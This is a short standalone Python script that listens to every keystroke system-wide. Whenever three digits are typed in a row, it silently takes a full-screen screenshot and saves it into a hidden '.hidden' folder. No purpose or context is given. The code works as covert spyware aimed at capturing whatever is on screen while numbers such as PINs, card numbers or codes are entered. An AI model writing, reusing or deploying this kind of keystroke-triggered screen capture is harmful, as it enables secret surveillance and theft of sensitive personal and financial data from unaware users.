from pynput import keyboard
from PIL import ImageGrab

number_pressed = 0
number_screen = 0

def on_press(key):
    global number_pressed
    try:
        if key.char == "0":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "1":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "2":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "3":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "4":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "5":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "6":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "7":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "8":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        elif key.char == "9":
            number_pressed = number_pressed + 1
            if number_pressed == 3:
                screens()
        else:
            number_pressed = 0
    except AttributeError as ex:
        print(ex)


def wait_for_user_input():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

def screens():
    global number_screen
    number_screen = number_screen + 1
    screenshot = ImageGrab.grab()
    screenshot.save('.hidden/screen' + str(number_screen) + '.png', 'PNG')

wait_for_user_input()
